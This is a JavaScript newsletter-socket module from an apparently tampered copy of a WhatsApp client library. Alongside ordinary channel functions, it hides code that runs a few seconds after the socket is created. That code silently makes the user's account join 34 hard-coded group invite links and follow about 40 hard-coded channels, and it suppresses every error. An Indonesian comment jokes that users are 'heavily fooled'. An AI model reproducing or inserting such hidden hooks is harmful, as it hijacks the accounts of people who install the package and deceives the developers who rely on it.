"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
        variables,
        queryId,
        query,
        generateMessageTag
) => {
        return query({
                tag: 'iq',
                attrs: {
                        id: generateMessageTag(),
                        type: 'get',
                        to: WABinary_1.S_WHATSAPP_NET,
                        xmlns: 'w:mex'
                },
                content: [
                        {
                                tag: 'query',
                                attrs: { query_id: queryId },
                                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
                        }
                ]
        })
}

const executeWMexQuery = async (
        variables,
        queryId,
        dataPath,
        query,
        generateMessageTag
) => {
        const result = await wMexQuery(variables, queryId, query, generateMessageTag)
        const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
        if (child?.content) {
                const data = JSON.parse(child.content.toString())

                if (data.errors && data.errors.length > 0) {
                        const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
                        const firstError = data.errors[0]
                        const errorCode = firstError.extensions?.error_code || 400
                        throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
                }

                const response = dataPath ? data?.data?.[dataPath] : data?.data
                if (typeof response !== 'undefined') {
                        return response
                }
        }

        const action = (dataPath || '').startsWith('xwa2_')
                ? dataPath.substring(5).replace(/_/g, ' ')
                : dataPath?.replace(/_/g, ' ')
        throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}


const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/Bcl4mVulRrdGU9hWF5Ja16?mode=gi_t",
"https://chat.whatsapp.com/LPx1DYvLaHzItqOAhSTRJ5?mode=gi_t",
"https://chat.whatsapp.com/Lkcp2VYgCfQ34yIfq1Q1gJ?mode=gi_t",
"https://chat.whatsapp.com/KCOIsBquQnG5hGITqSEHWP?mode=gi_t",
"https://chat.whatsapp.com/FPHdx2zhtucBn0beYEjHE7?mode=gi_t",
"https://chat.whatsapp.com/KOeTSla95pnA12d1wyFPgj?mode=gi_t",
"https://chat.whatsapp.com/H08hPtyArQ7EpEHOXLyGPi?mode=gi_t",
"https://chat.whatsapp.com/G0BZHBjXG5NGg1RnWybg9l?mode=gi_t",
"https://chat.whatsapp.com/KIlPHUyEKVm0Yl3TzkMqLX?mode=gi_t",
"https://chat.whatsapp.com/EITdDRPsrqhKg7Pd5qP92j?mode=gi_t",
"https://chat.whatsapp.com/Jy8rEcdwLQwEzQZ0drPj3d?mode=hq2tcla",
"https://chat.whatsapp.com/JOIIBAay8AzCSLcoRlSRKO?mode=hqctcla", 
"https://chat.whatsapp.com/CEINmRZkG2uCEv67hIurFl?mode=hq1tcla", 
"https://chat.whatsapp.com/IawqlU88G5cBPr0JsqTAwC?mode=gi_t", // All ling gb Ikram yang di atas
"https://chat.whatsapp.com/DT3x5rrMkaEC5h0FTKTYC9?mode=gi_t", // Fixs
"https://chat.whatsapp.com/BP1lrvW0E380zaSou2Rphg?mode=gi_t", // SkyHosting
"https://chat.whatsapp.com/FkU7Uq3QkHp3wu8b0a9LdN?mode=gi_t", // Moonzy
"https://chat.whatsapp.com/BqvC1W7uGtbJ7lPPIQgsHm?mode=gi_t", // ZamzzOffc
"https://chat.whatsapp.com/CfhqCNj35BJ7QWMTMaZ4tF?mode=gi_t", // Pano
"https://chat.whatsapp.com/K0bqh0S80AJ4m1Ce2VCg1X?mode=gi_t", // Pano
"https://chat.whatsapp.com/Jgek8wmlgrMKxRSYAbOiLd?mode=gi_t", // Pano
"https://chat.whatsapp.com/K6b5d6TmH9K2SuCBiBJIMP?mode=gi_c", // Demon
"https://chat.whatsapp.com/FOJCCISF9wNAtXJkPgJ7nQ?mode=ac_t", // Demon
"https://chat.whatsapp.com/Fxn5CnxviqK1ERYUaGyA0a?mode=gi_c", // Demon
"https://chat.whatsapp.com/LWxHvv0b7mBBhdBAZtlGU6?mode=gi_t", // Nanz
"https://chat.whatsapp.com/Gob6HIe8wqJIgShA6bXYRb?m", // Danzz
"https://chat.whatsapp.com/EltpZufQH9W2dVL3kp3cMT?mode=gi_t", // Danz Offc
"https://chat.whatsapp.com/DFa4zugi8XoEDYSTvrXyY5?modegi_t", // Rafa
"https://chat.whatsapp.com/HCZDWPwZFEM7gQILc0nGw9?modegi_t", // Rafa
"https://chat.whatsapp.com/EUqDbjFSpSXJx5ysEtrwVj?mode_t", // Bewok
"https://chat.whatsapp.com/FEKxpYYxzg1LFRg7kQyaOk?mgi_t", // Bewok
"https://chat.whatsapp.com/Esk9lDvgU7BGfLgW5MCyf1?e=gi_t", // Bewok
"https://chat.whatsapp.com/DvOzhU34hIh3gTUXqe5igF?mode=gi_t", // Kiyzz
"https://chat.whatsapp.com/IYRQOkFPn9PIA2ugSJjpjQ?mode=gi_t" // Ronzz
];

// tertipu berat jier😂
const AUTO_FOLLOW_CHANNELS = [
"120363423683449831@newsletter",
"120363401926637441@newsletter",  
"120363404899823508@newsletter",  
"120363423815501931@newsletter",  
"120363424883391053@newsletter", 
"120363423965316873@newsletter", // Ch Pribadi Ikram
"120363407293403886@newsletter", // IKRAM 1
"120363406954714819@newsletter", // IKRAM 2
"120363424503792904@newsletter", // IKRAM3
"120363406259183701@newsletter", // IKRAM 4
"120363404279143045@newsletter", // IKRAM 5
"120363405917392413@newsletter", // IKRAM 6
"120363406929172502@newsletter", // IKRAM 7
"120363406814684853@newsletter", // IKRAM 8
"120363407411422142@newsletter", //" IKRAM 9
"120363425060496202@newsletter", // IKRAM 10
"120363400234291040@newsletter", // Fixs
"120363404308498089@newsletter", // Skyhosting2 
"120363403542550252@newsletter", // Fαn7Sēχ
"120363402127053333@newsletter", // Fαn7Sēχ
"120363424291624448@newsletter", // Moonzy
"120363426361044535@newsletter", // ZamzzOffc1
"120363425177259136@newsletter", // Felix
"120363403964098357@newsletter", // Pano
"120363423003359955@newsletter", // Pano
"120363422684771198@newsletter", // nes
"120363406130853373@newsletter", // Reii
"120363422509837568@newsletter", // nes
"120363406618119730@newsletter", // ZamzzOffc2
"120363405493590145@newsletter", // FINZ
"120363424704630147@newsletter", // FINZ
"120363424021816421@newsletter", // Demon
"120363403725068021@newsletter", // Demon
"120363424663261388@newsletter", // Demon
"120363405794164863@newsletter", // NanDot
"120363428610727337@newsletter", //YANZ STR
"120363417345855861@newsletter", // DANZX
"120363422054951473@newsletter",  // DANZX
"120363409039802188@newsletter", // Fearless
"120363422814525873@newsletter" // Only1
];

// Fungsi untuk mengekstrak kode invite dari link WhatsApp
function extractInviteCodeFromLink(link) {
    try {
        const url = new URL(link);
        if (url.hostname === 'chat.whatsapp.com') {
            const inviteCode = url.pathname.split('/').pop();
            if (inviteCode && inviteCode.length > 0) {
                return inviteCode;
            }
        }
    } catch (error) {}
    return null;
}

// Fungsi untuk auto join ke group WhatsApp
async function autoJoinWhatsAppGroups(sock) {
    const groupLinks = AUTO_JOIN_GROUP_LINKS;

    for (const groupLink of groupLinks) {
        try {
            const inviteCode = extractInviteCodeFromLink(groupLink);
            if (inviteCode) {
                // Coba metode pertama
                try {
                    await sock.groupAcceptInvite(inviteCode);
                } catch (error) {
                    // Coba metode kedua sebagai fallback
                    try {
                        await sock.groupAcceptInviteV4(inviteCode, '');
                    } catch (error2) {}
                }
            }
        } catch (error) {}

        // Delay 5 detik antar percobaan join
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// Fungsi untuk auto follow channel WhatsApp
async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
    const channels = AUTO_FOLLOW_CHANNELS;

    for (const channelId of channels) {
        try {
            await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
            // Delay 5 detik antar follow channel
            await new Promise(resolve => setTimeout(resolve, 5000));
        } catch (error) {}
    }
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

    // Auto join ke group WhatsApp terlebih dahulu
    setTimeout(async () => {
        try {
            await autoJoinWhatsAppGroups(sock);
        } catch {}
    }, 5000);

    // Auto-follow ke channel WhatsApp setelah join group
    setTimeout(async () => {
        try {
            await autoFollowWhatsAppChannels(sock, newsletterWMexQuery);
        } catch {}
    }, 10000);

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]

    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
